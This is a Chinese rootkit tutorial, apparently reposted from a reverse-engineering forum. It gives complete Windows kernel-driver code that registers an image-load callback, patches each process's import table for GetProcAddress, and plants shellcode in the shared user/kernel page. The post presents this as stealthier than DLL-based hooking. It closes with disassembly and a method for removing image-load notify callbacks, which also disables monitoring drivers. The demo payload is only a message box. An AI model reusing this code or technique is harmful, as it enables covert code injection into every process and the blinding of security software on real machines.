
# Rootkit Hook 之[七]--- IAT Hook

> 原文：[`www.pediy.com/kssd/pediy10/60778.html`](https://www.pediy.com/kssd/pediy10/60778.html)

今天这篇 HOOK，主要是讲在内核中 HOOK WIN32 API 的办法。这个办法，比你采用全局钩子加载 DLL 来 HOOK API 的方法更具有隐蔽性。 到这里我们的内核 hook 7 篇组成的“七星剑法“就练完了。后面将开始关于保护模式的八篇文章，希望大家继续跟贴鼓励。

在内核中 hook win32 api 需要用 shellcode 的东西。因此在内核中 hook win32 api 也具有魅力。因此，为了写好此篇，也花费了我不少时间。篇幅较长，大家慢慢看。

这里有个问题要解决，就是你的 hook 函数是在 ring0 中实现的，ring3 如何能访问到呢？

俗话说，天无绝人之路，总会有解决办法的。

就是 Barnaby Jack 在论文“Remote Windows Kernel Exploitation: Step into the Ring 0”中所用的技术。它利用了两个虚地址映射到同一个物理地址这个事实。内核地址 `0xFFDF0000` 和用户地址 `0x7FFE0000` 都指向同一物理页面。 内核地址是可写的，但用户地址则不能。

也就说是说，我们可以在 ring0 层把信息写入到 `0xFFDF0000~0xFFDF0FFF` 的 4K 虚拟页面空间，由于用户地址 `0x7FFE0000` 也指向这个物理页面，所以我们在 `0xFFDF0000~0xFFDF0FFF` 地址写入的代码，在用户空间可以访问到。

该共享区域的大小是 4K。内核占用其中一部分，内存区域的名称是 `KUSER_SHARED_DATA`。可以在 WinDbg 中看看。

```
lkd> dt nt!_KUSER_SHARED_DATA

   +0x000 TickCountLow     : Uint4B
   +0x004 TickCountMultiplier : Uint4B
   +0x008 InterruptTime    : _KSYSTEM_TIME
   +0x014 SystemTime       : _KSYSTEM_TIME
   +0x020 TimeZoneBias     : _KSYSTEM_TIME
   +0x02c ImageNumberLow   : Uint2B
   +0x02e ImageNumberHigh  : Uint2B
   +0x030 NtSystemRoot     : [260] Uint2B
   +0x238 MaxStackTraceDepth : Uint4B
   +0x23c CryptoExponent   : Uint4B
   +0x240 TimeZoneId       : Uint4B
   +0x244 Reserved2        : [8] Uint4B
   +0x264 NtProductType    : _NT_PRODUCT_TYPE
   +0x268 ProductTypeIsValid : UChar
   +0x26c NtMajorVersion   : Uint4B
   +0x270 NtMinorVersion   : Uint4B
   +0x274 ProcessorFeatures : [64] UChar
   +0x2b4 Reserved1        : Uint4B
   +0x2b8 Reserved3        : Uint4B
   +0x2bc TimeSlip         : Uint4B
   +0x2c0 AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE
   +0x2c8 SystemExpirationDate : _LARGE_INTEGER
   +0x2d0 SuiteMask        : Uint4B
   +0x2d4 KdDebuggerEnabled : UChar
   +0x2d5 NXSupportPolicy  : UChar
   +0x2d8 ActiveConsoleId  : Uint4B
   +0x2dc DismountCount    : Uint4B
   +0x2e0 ComPlusPackage   : Uint4B
   +0x2e4 LastSystemRITEventTickCount : Uint4B
   +0x2e8 NumberOfPhysicalPages : Uint4B
   +0x2ec SafeBootMode     : UChar
   +0x2f0 TraceLogging     : Uint4B
   +0x2f8 TestRetInstruction : Uint8B
   +0x300 SystemCall       : Uint4B
   +0x304 SystemCallReturn : Uint4B
   +0x308 SystemCallPad    : [3] Uint8B
   +0x320 TickCount        : _KSYSTEM_TIME
   +0x320 TickCountQuad    : Uint8B
   +0x330 Cookie           : Uint4B
```

我们看到 4K 页面对应的字节数是 `0x1000`，而实际操作系统只占用了 `0x334` 字节。而剩下的空间，我们当然可以利用了。demo 程序中是从偏移 800 的位置开始的。这样，可用的字节数有 2047 个字节。

到这里，所有的问题都解决了。当然了，这也不是唯一的解决办法，你也可以不把 hook 函数放在 ring0 中，而是在 ring0 里将其注入到 ring3 某个模块的缝隙里。

接下来，谈谈我们的思路，写一个驱动，利用 `PsSetLoadImageNotifyRoutine` 加载一个回调函数，由于回调函数中已经具备当前进程的一些信息，我们在这个回调函数中利用 IAT hook 的方式 hook 一个 api，例如 hook `GetProcAddress`。我们把要执行的函数写入共享区中。IAT HOOK 的时候，直接指向共享区中我们写入的函数的地址。 当用户程序调用 `GetProcAddress` api 函数的时候，共享区中的这段 shellcode 码便被执行了。我们 demo 是指要调用 `GetProcAddress` 的地方都会弹出一个对话框。

简单写一个 shellcode 如下：

```c
#include "windows.h"

int main(int argc, char* argv[])
{
    HMODULE hM = LoadLibrary("user32.dll");
  _asm
  {
    push ebp
      call Deleta
Deleta:
    pop ebp
    sub ebp,offset Deleta
    jmp $+0x0d

fun1:                   //MessageBoxA 的地址，这个我偷懒，是参照我机器上的写
                       死了，正规讲，要从 iat 中找出来，或者从 user32.dll 模块
                       的导出表中找出来，反正这里是个 demo，没必要那么讲究
                       了。
       _emit 0x02
     _emit 0x07
     _emit 0xd5
     _emit 0x77

fun2:                  //GetProcAddress 地址 ，这个在 IAT 中替换
       _emit 0xa0
     _emit 0xad
     _emit 0x80
     _emit 0x7c
    push 0x00000040
       call L1
    _emit 'h'
    _emit 'e'
    _emit 'l'
    _emit 'l'
    _emit 'o'
    _emit 0
    _emit 0
    _emit 0

L1:
    call L2
    _emit 'C'
    _emit 'o'
    _emit 'm'
    _emit 'b'
    _emit 'o'
    _emit 'j'
    _emit 'i'
    _emit 'a'
    _emit 'n'
    _emit 'g'
    _emit 0
    _emit 0

L2:
    push 0
    lea eax,[ebp + fun1]
    call [eax]
    lea eax,[ebp + fun2]
    pop ebp
    jmp DWORD ptr[eax]
  }
  return 0;
}
```

提取代码为：

```c
unsigned char new_code[] = {
                     0x55, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81, 0xED, 0x45,
                0x10, 0x40, 0x00, 0xE9, 0x08, 0x00, 0x00, 0x00, 0x02, 0x07,
                0xD5, 0x77, 0xa0, 0xad, 0x80, 0x7c, 0x6A, 0x40, 0xE8, 0x08,
                0x00, 0x00, 0x00, 0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x00, 0x00,
                0x00, 0xE8, 0x0c, 0x00, 0x00, 0x00, 0x43, 0x6F, 0x6D, 0x62,
                0x6F, 0x6A, 0x69, 0x61, 0x6E, 0x67, 0x00, 0x00, 0x6A, 0x00,
                0x8d, 0x85, 0x51, 0x10, 0x40, 0x00, 0xFF, 0x10, 0x8d, 0x85,
                0x55, 0x10, 0x40, 0x00, 0x5d, 0xFF, 0x20};
```

呵呵，自从挂接了这个驱动，我的机器里面，随便启动个程序，就不停的弹出窗口了。下面贴出核心代码来。

```c
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
         IN PUNICODE_STRING theRegistryPath)
{
  NTSTATUS ntStatus;
  gb_Hooked = FALSE; // We have not hooked yet
  ntStatus = PsSetLoadImageNotifyRoutine(MyImageLoadNotify);
    return ntStatus;
}

VOID MyImageLoadNotify(IN PUNICODE_STRING  FullImageName,
                  IN HANDLE  ProcessId, // Process where image is mapped
                  IN PIMAGE_INFO  ImageInfo)
{
  UNICODE_STRING u_targetDLL;
  DbgPrint("Image name: %ws\n", FullImageName->Buffer);

  // Setup the name of the DLL to target
  RtlInitUnicodeString(&u_targetDLL, L"\\WINDOWS\\system32\\user32.dll");

  if (RtlCompareUnicodeString(FullImageName, &u_targetDLL, TRUE) == 0)
  {
    DbgPrint(" imageInfo->ImageBase:%x  ProcessId : %d\n", ImageInfo->ImageBase, ProcessId);

    HookIAT(&u_targetDLL,"GetProcAddress",ProcessId);
  }
}

NTSTATUS HookIAT(PUNICODE_STRING pModuleName, PCHAR pFunctionName,  HANDLE  ProcessId)
{
    ULONG pEProcess;
  PLIST_ENTRY pCurrentList = NULL, pTempList = NULL, pLoadOrderModuleList, list;
  PPEB pPeb = NULL;
    ULONG hModule, temp;
  PsLookupProcessByProcessId(ProcessId,(PEPROCESS*)&pEProcess);
  pPeb = (PPEB)(* (PULONG)(pEProcess + PEBOFFSET));
  if(pPeb != NULL)
  {
    KeAttachProcess((PEPROCESS)pEProcess);  // 切换内存上下文到指定的进程
    //遍历进程模块
    pLoadOrderModuleList = pPeb->LoaderData->InLoadOrderModuleList.Flink;
      list = pLoadOrderModuleList;
      do   // 遍历进程所加载模块中，直到找到 EXE 模块
    {
         UNICODE_STRING pstrTemp = ((PLDR_MODULE)list)->FullDllName;
           DbgPrint("module name = %ws\n\n\n\n",pstrTemp.Buffer);
       if(wcsstr(pstrTemp.Buffer,L".exe") != NULL)
       {
          hModule = (ULONG)((PLDR_MODULE)list)->BaseAddress;
          temp = * (PULONG)hModule;
          DbgPrint("Find Module baseAaddress = %x\n\n\n",hModule);

            HookImportsOfImage((PIMAGE_DOS_HEADER)hModule,ProcessId,pFunctionName);
          break;
       }
       list = list->Flink;
    } while(list != pLoadOrderModuleList);
    KeDetachProcess();
  }

    return STATUS_SUCCESS;
}

NTSTATUS HookImportsOfImage(PIMAGE_DOS_HEADER image_addr, HANDLE h_proc,PCHAR pc_fnctar)
{
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS pNTHeader;
  PIMAGE_IMPORT_DESCRIPTOR importDesc;
  PIMAGE_IMPORT_BY_NAME p_ibn;
  DWORD importsStartRVA;
  PDWORD pd_IAT, pd_INTTO;
  int count, index;
  char *dll_name = NULL;
  char *pc_dlltar = "kernel32.dll";
  PMDL  p_mdl;
  PDWORD MappedImTable;
  DWORD d_sharedM = 0x7ffe0800;
  DWORD d_sharedK = 0xffdf0800;
  unsigned char new_code[] = {
```



```
0x55, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81, 0xED, 0x45,
0x10, 0x40, 0x00, 0xE9, 0x08, 0x00, 0x00, 0x00, 0x02, 0x07,
0xD5, 0x77, 0xa0, 0xad, 0x80, 0x7c, 0x6A, 0x40, 0xE8, 0x08,
0x00, 0x00, 0x00, 0x68, 0x65, 0x6C, 0x6C, 0x6F, 0x00, 0x00,
0x00, 0xE8, 0x0c, 0x00, 0x00, 0x00, 0x43, 0x6F, 0x6D, 0x62,
0x6F, 0x6A, 0x69, 0x61, 0x6E, 0x67, 0x00, 0x00, 0x6A, 0x00,
0x8d, 0x85, 0x51, 0x10, 0x40, 0x00, 0xFF, 0x10, 0x8d, 0x85,
0x55, 0x10, 0x40, 0x00, 0x5d, 0xFF, 0x20};
```

`dosHeader` = `(PIMAGE_DOS_HEADER)` `image_addr`;

`pNTHeader` = `MakePtr(PIMAGE_NT_HEADERS, dosHeader, dosHeader->e_lfanew);`

// First, verify that the `e_lfanew` field gave us a reasonable
// pointer, then verify the PE signature.

`if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)`
  `return STATUS_INVALID_IMAGE_FORMAT;`

`importsStartRVA` = `pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;`

`if (!importsStartRVA)`
  `return STATUS_INVALID_IMAGE_FORMAT;`

`importDesc` = `(PIMAGE_IMPORT_DESCRIPTOR)(importsStartRVA + (DWORD)dosHeader);`

`for (count = 0; importDesc[count].Characteristics != 0; count++)`
`{`
  `dll_name` = `(char*)(importDesc[count].Name + (DWORD)dosHeader);`
  `DbgPrint("Imports from DLL: %s", dll_name);`
  `pd_IAT` = `(PDWORD)(((DWORD)dosHeader) + (DWORD)importDesc[count].FirstThunk);`
  `pd_INTO` = `(PDWORD)(((DWORD)dosHeader) + (DWORD)importDesc[count].OriginalFirstThunk);`
  `for (index = 0; pd_IAT[index] != 0; index++)`
  `{`
    `DbgPrint("Imports from DLL: %s", dll_name);`
    `DbgPrint(" Address: %x\n\n\n\n", pd_IAT[index]);`
    // If this is an import by ordinal the high
    // bit is set
    `if ((pd_INTO[index] & IMAGE_ORDINAL_FLAG) != IMAGE_ORDINAL_FLAG)`
    `{`
      `p_ibn` = `(PIMAGE_IMPORT_BY_NAME)(pd_INTO[index]+((DWORD)dosHeader));`
      `if ((_stricmp(dll_name, pc_dlltar) == 0) && (strcmp(p_ibn->Name, pc_fnctar) == 0))`
      `{`
        `DbgPrint("Imports from DLL: %s", dll_name);`
        `DbgPrint(" Name: %s Address: %x\n", p_ibn->Name, pd_IAT[index]);`
        // Use the trick you already learned to map a different
        // virtual address to the same physical page so no
        // permission problems.
        //
        // Map the memory into our domain so we can change the permissions on the MDL
        `p_mdl` = `MmCreateMdl(NULL, &pd_IAT[index], 4);`
        `if(!p_mdl)`
          `return STATUS_UNSUCCESSFUL;`
        `MmBuildMdlForNonPagedPool(p_mdl);`
        // Change the flags of the MDL
        `p_mdl->MdlFlags` = `p_mdl->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;`
        `MappedImTable` = `MmMapLockedPages(p_mdl, KernelMode);`
        `if (!gb_Hooked)`
        `{`
            // Writing the raw opcodes to memory
          // used a kernel address that gets mapped
          // into the address space of all processes
          // thanks to Barnaby Jack
          `DbgPrint("do........\n\n\n");`
          `RtlCopyMemory((PVOID)d_sharedK, new_code, 77);`
          `RtlCopyMemory((PVOID)(d_sharedK+22),(PVOID)&pd_IAT[index], 4);`
        // `gb_Hooked` = `TRUE;`
        }
        // Offset to the "new function"
        `*MappedImTable` = `d_sharedM;`
        // Free MDL
        `MmUnmapLockedPages(MappedImTable, p_mdl);`
        `IoFreeMdl(p_mdl);`
      }
    }
  }
}
`return STATUS_SUCCESS;`
}

最后谈谈如何去除这种挂钩的办法。俗话说“知己知彼，百战不殆”。我们先分析看看它的实现原理。

`lkd> u PsSetLoadImageNotifyRoutine l 50`

`nt!PsSetLoadImageNotifyRoutine:`

```
805c609e 8bff            mov     edi,edi
805c60a0 55              push    ebp
805c60a1 8bec            mov     ebp,esp
805c60a3 53              push    ebx
805c60a4 57              push    edi
805c60a5 33ff            xor     edi,edi
805c60a7 57              push    edi ；参数压栈
805c60a8 ff7508          push    dword ptr [ebp+8]  ；参数压栈
805c60ab e8ccd00300      call    nt!ExAllocateCallBack (8060317c) ；函数调用
805c60b0 8bd8            mov     ebx,eax ;保存返回值
；判断是否成功，不成功则退出
805c60b2 3bdf            cmp     ebx,edi
805c60b4 7507            jne     nt!PsSetLoadImageNotifyRoutine+0x1f (805c60bd)
805c60b6 b89a0000c0      mov     eax,0C000009Ah
805c60bb eb2a            jmp     nt!PsSetLoadImageNotifyRoutine+0x49 (805c60e7)
；成功跳到这里
805c60bd 56              push    esi
805c60be bee0a75580      mov     esi,offset nt!PspLoadImageNotifyRoutine (8055a7e0)
805c60c3 6a00            push    0
805c60c5 53              push    ebx
805c60c6 56              push    esi
805c60c7 e8e0d00300      call    nt!ExCompareExchangeCallBack (806031ac)
805c60cc 84c0            test    al,al
；找到并交换跳转
805c60ce 751d            jne     nt!PsSetLoadImageNotifyRoutine+0x4f (805c60ed) ；
；没找到则继续循环
805c60d0 83c704          add     edi,4
805c60d3 83c604          add     esi,4
805c60d6 83ff20          cmp     edi,20h
805c60d9 72e8            jb      nt!PsSetLoadImageNotifyRoutine+0x25 (805c60c3)
；如果找遍了这个表都没有找到空的位置，则返回错误退出
805c60db 53              push    ebx
805c60dc e80d010200      call    nt!SeFreePrivileges (805e61ee)
805c60e1 b89a0000c0      mov     eax,0C000009Ah
805c60e6 5e              pop     esi
805c60e7 5f              pop     edi
805c60e8 5b              pop     ebx
805c60e9 5d              pop     ebp
805c60ea c20400          ret     4
；修改计数和标记
805c60ed b801000000      mov     eax,1
805c60f2 b9c8a75580     mov     ecx,offset nt!PspLoadImageNotifyRoutineCount (8055a7c8)
805c60f7 0fc101          xadd    dword ptr [ecx],eax
805c60fa c605bcf2668001 mov     byte ptr [nt!PsImageNotifyEnabled (8066f2bc)],1
805c6101 33c0            xor     eax,eax
805c6103 ebe1            jmp     nt!PsSetLoadImageNotifyRoutine+0x48 (805c60e6)
```

逆向为 `C` 的代码如下：

```
NTSTATUS PsSetLoadImageNotifyRoutine(
    IN PLOAD_IMAGE_NOTIFY_ROUTINE  NotifyRoutine
    )
{
    ULONG i;
    PEX_CALLBACK_ROUTINE_BLOCK CallBack;
    CallBack = ExAllocateCallBack(NotifyRoutine, NULL);
    if( CallBack == NULL)
        return STATUS_INSUFFICIENT_RESOURCES;
    for (i = 0; i < 0x20/4; i++)
    {
        if(ExCompareExchangeCallBack(&PspLoadImageNotifyRoutine[i],
                                      CallBack, 0)
        {
            InterlockedIncrement(&PspLoadImageNotifyRoutineCount);
            PsImageNotifyEnable = TRUE;
            return STATUS_SUCCESS;
        }
    }
    //释放 CallBack 这块内存
    SeFreePrivileges (CallBack);
    return STATUS_INSUFFICIENT_RESOURCES;
}
```

`lkd> u ExAllocateCallBack l 30`

`nt!ExAllocateCallBack:`

```
8060317c 8bff            mov     edi,edi
8060317e 55              push    ebp
8060317f 8bec            mov     ebp,esp
80603181 6843627262      push    62726243h
80603186 6a0c            push    0Ch
80603188 6a01            push    1
8060318a e8f122f4ff      call    nt!ExAllocatePoolWithTag (80545480)
8060318f 85c0            test    eax,eax
80603191 740f            je      nt!ExAllocateCallBack+0x26 (806031a2)
80603193 8b4d08          mov     ecx,dword ptr [ebp+8]
80603196 832000          and     dword ptr [eax],0
80603199 894804          mov     dword ptr [eax+4],ecx
8060319c 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
8060319f 894808          mov     dword ptr [eax+8],ecx
806031a2 5d              pop     ebp
806031a3 c20800          ret     8
```

逆向为 `C` 的代码如下：



```c
typedef struct _EX_CALLBACK_ROUTINE_BLOCK {

    EX_RUNDOWN_REF        RundownProtect;

    PEX_CALLBACK_FUNCTION Function;

    PVOID                 Context;

} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

PEX_CALLBACK_ROUTINE_BLOCK  ExAllocateCallBack (

    IN PEX_CALLBACK_FUNCTION Function,

    IN PVOID Context

    )

{

     PEX_CALLBACK_ROUTINE_BLOCK    CallBack;

     CallBack = ExAllocatePoolWithTag(1, 0x0c, 0x62726243);

     if(CallBack）

     {

         CallBack->RundownProtect = 0;

         CallBack->Function = Function;

         CallBack->Context = Context;

     }

}
```

```
lkd> u SeFreePrivileges

nt!SeFreePrivileges:

805e61ee 8bff             mov     edi,edi

805e61f0 55               push    ebp

805e61f1 8bec             mov     ebp,esp

805e61f3 6a00             push    0

805e61f5 ff7508           push    dword ptr [ebp+8]

805e61f8 e8e9ebf5ff       call    nt!ExFreePoolWithTag (80544de6)

805e61fd 5d               pop     ebp

805e61fe c20400           ret     4
```

逆向为 C 的代码如下：

```c
VOID SeFreePrivileges(

    IN PEX_CALLBACK_ROUTINE_BLOCK    CallBack

    )

{

     ExFreePoolWithTag (CallBack,0);

}
```

下面我们总结下 `PsSetLoadImageNotifyRoutine` 的工作原理：

1. 设置回调函数就是往数组中填充函数指针，数组名为 `PspLoadImageNotifyRoutine`，数组大小为 `0x20` 个字节，共 8 个元素，也就是说，最多存储 8 个回调函数。数组已经填充的元素个数为 `PspLoadImageNotifyRoutineCount`，`PsImageNotifyEnable` 为活动标记，这些都是全局变量。
2. 当 `pe` 文件被加载时，`pe loader` 会调用 `MmMapViewOfSection`，在这个函数中会调用 `MiMapViewOfImageSection` 函数，`MiMapViewOfImageSection` 会根据 `PsImageNotifyEnable` 标记来填充 `IMAGE_INFO` 结构，并执行 `PspLoadImageNotifyRoutine` 数组里面的回调函数。

在我的电脑中，`PspLoadImageNotifyRoutine` 数组的内容如下：

```
lkd> dd 8055a7e0

8055a7e0  e146509f 00000000 00000000 00000000

8055a7f0  00000000 00000000 00000000 00000000
```

看到这里，我们的解决办法就有了,![](img/022c916b9660e467a8663bd57a4ae6d1.jpg "狂笑")

如果不想让某个 `NotifyRoutine` 监控，就把它在 `PspLoadImageNotifyRoutine` 数组中对应项清空，可是 `PspLoadImageNotifyRoutine` 并没有导出，我们不能直接调用，有什么方法呢？对于这种情况的去除，这里也给出一个办法。

1. 我们自己写个 `MyNotifyRoutine`。

```c
VOID MyNotifyRoutine(
IN PUNICODE_STRING  FullImageName,
 IN HANDLE  ProcessId, 
 IN PIMAGE_INFO  ImageInfo)

{
    return;
}
```

2. `PsSetLoadImageNotifyRoutine(MyNotifyRoutine);`
3. 直接在 `PsSetLoadImageNotifyRoutine` 函数里找有效地址，然后访问这个地址，看有没有 `MyNotifyRoutine` 的地址，没有的话再找下一个；
4. 直到找到为止，那么此时这个有效地址就是 `PspLoadImageNotifyRoutine` 的地址了
5. 遍历 `PspLoadImageNotifyRoutine` 数组中的地址，检查这些地址是否落在某个驱动程序的地址范围，如果是的话，清了这一项，现在再 `LoadLibrary` 这个驱动程序就不会收到任何通知了。如果你闲麻烦就直接把 `PspLoadImageNotifyRoutine` 所有项都清理掉。

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `HybridHook.rar` \[解压密码：`pediy`\]   |
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `testtest.rar`   |
